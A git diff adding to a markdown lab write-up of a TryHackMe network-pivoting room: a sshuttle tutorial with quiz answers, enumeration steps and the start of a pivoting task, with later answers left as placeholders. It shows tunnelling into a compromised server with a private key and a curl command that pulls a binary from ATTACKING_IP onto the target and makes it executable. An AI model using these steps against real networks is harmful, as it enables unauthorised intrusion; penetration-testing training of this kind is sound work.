@@ -751,9 +751,253 @@ _Note: When using Chisel on Windows, it's important to remember to upload it wit
 ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
 ```
 
-
-
 ## sshuttle
+
+Finally, let's take a look at our last tool of this section: [sshuttle](https://github.com/sshuttle/sshuttle).
+
+This tool is quite different from the others we have covered so far. It doesn't perform a port forward, and the proxy it creates is nothing like the ones we have already seen. Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. In short, it simulates a VPN, allowing us to route our traffic through the proxy _without the use of proxychains_ (or an equivalent). We can just directly connect to devices in the target network as we would normally connect to networked devices. As it creates a tunnel through SSH (the secure shell), anything we send through the tunnel is also encrypted, which is a nice bonus. We use sshuttle entirely on our attacking machine, in much the same way we would SSH into a remote server.\
+
+
+Whilst this sounds like an incredible upgrade, it is not without its drawbacks. For a start, sshuttle only works on Linux targets. It also requires access to the compromised server via SSH, and Python also needs to be installed on the server. That said, with SSH access, it could theoretically be possible to upload a static copy of Python and work with that. These restrictions do somewhat limit the uses for sshuttle; however, when it _is_ an option, it tends to be a superb bet!
+
+First of all we need to install sshuttle. On Kali this is as easy as using the `apt` package manager:\
+`sudo apt install sshuttle`\
+
+
+The base command for connecting to a server with sshuttle is as follows:\
+`sshuttle -r username@address subnet` \
+
+
+For example, in our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:\
+`sshuttle -r user@172.16.0.5 172.16.0.0/24`\
+
+
+We would then be asked for the user's password, and the proxy would be established. The tool will then just sit passively in the background and forward relevant traffic into the target network.\
+
+
+Rather than specifying subnets, we could also use the `-N` option which attempts to determine them automatically based on the compromised server's own routing table:\
+`sshuttle -r username@address -N`\
+
+
+Bear in mind that this may not always be successful though!\
+
+
+As with the previous tools, these commands could also be backgrounded by appending the ampersand (`&`) symbol to the end.
+
+If this has worked, you should see the following line:\
+`c : Connected to server.`\
+
+
+Well, that's great, but what happens if we don't have the user's password, or the server only accepts key-based authentication?
+
+Unfortunately, sshuttle doesn't currently seem to have a shorthand for specifying a private key to authenticate to the server with. That said, we can easily bypass this limitation using the `--ssh-cmd` switch.
+
+This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply `ssh` with no arguments. With the `--ssh-cmd` switch, we can pick a different command to execute for authentication: say, `ssh -i keyfile`, for example!
+
+So, when using key-based authentication, the final command looks something like this:\
+`sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`\
+
+
+To use our example from before, the command would be:\
+`sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`\
+
+
+**Please Note:** When using sshuttle, you may encounter an error that looks like this:\
+`client: Connected.`\
+`client_loop: send disconnect: Broken pipe`\
+`client: fatal: server died with error code 255`\
+
+
+This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.
+
+To get around this, we tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch.
+
+To use our earlier example:\
+`sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`\
+
+
+This will allow sshuttle to create a connection without disrupting itself.
+
+### Answer the questions
+
+**How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16**
+
+```
+sshuttle -r pwned@172.16.20.7 172.16.0.0/16
+```
+
+**What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv\_key" located in the current directory?**
+
+```
+--ssh-cmd "ssh  -i priv_key"
+```
+
+**You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error. What switch (and argument) could you use to fix this error?**
+
+```
+-x 172.16.0.100
+```
+
+## Enumeration
+
+Download a [static nmap binary](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap). Rename it to `nmap-USERNAME`, substituting in your own TryHackMe username. Finally, upload it to the target in a manner of your choosing.
+
+For example, with a Python webserver:-
+
+On Kali (inside the directory containing your Nmap binary):
+
+`sudo python3 -m http.server 80`
+
+Then, on the target:
+
+`curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME`\
+
+
+![Using cURL and a Python HTTP server to upload nmap to the target](https://assets.tryhackme.com/additional/wreath-network/f621bb960163.png)
+
+Now use the binary to scan the network. The command will look something like this:
+
+`./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME`
+
+You will need to substitute in your username, and the correct IP range. For example:
+
+`./nmap-MuirlandOracle -sn 10.200.72.1-255 -oN scan-MuirlandOracle`
+
+Here the `-sn` switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.\
+
+
+Note that this would also work with CIDR notation (e.g. 10.x.x.0/24).\
+
+
+Use what you've learnt to answer the following questions!
+
+_Note: The host ending in_ `.250` _is the OpenVPN server, and should be excluded from all answers. It is not part of the vulnerable network, and should not be targeted. The same goes for the host ending in_ `.1` _(part of the AWS infrastructure used to create the network) -- this too is out of scope and should be excluded from all answers._
+
+### Answer the questions
+
+**Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?**
+
+```
+// Some code
+```
+
+
+
+**In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)**
+
+```
+/
+```
+
+**Scan the hosts -- which one does&#x20;**_**not**_**&#x20;return a status of "filtered" for every port (submit the last octet only)?**
+
+```
+/
+```
+
+
+
+**Let's assume that the other host is inaccessible from our current position in the network. Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?**
+
+```
+/
+```
+
+**We cannot currently perform a service detection scan on the target without first setting up a proxy, so for the time being, let's assume that the services Nmap has identified based on their port number are accurate. (Please feel free to experiment with other scan types through a proxy after completing the pivoting section).**
+
+**Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?**
+
+```
+/
+```
+
+
+
+## Pivoting
+
+Thinking about the interesting service on the next target that we discovered in the previous task, pick a pivoting technique and use it to connect to this service, using the web browser on your attacking machine!&#x20;
+
+As a word of advice: sshuttle is highly recommended for creating an initial access point into the rest of the network. This is because the firewall on the CentOS target will prove problematic with some of the techniques shown here. We will learn how to mitigate against this later in the room, although if you're comfortable opening up a port using firewalld then port forwarding or a proxy would also work.
+
+### Answer the questions
+
+**What is the name of the program running the service?**
+
+```
+/
+```
+
+Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle:\
+`http://IP/ANSWER`\
+
+
+When navigating to this URI, we are given the following login page:\
+![Image showing the login screen for the service](https://assets.tryhackme.com/additional/wreath-network/409f76a17496.png)\
+
+
+**Do these default credentials work (Aye/Nay)?**
+
+```
+/
+```
+
+**You will see that there are three publicly available exploits.**
+
+**There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?**
+
+```
+/
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
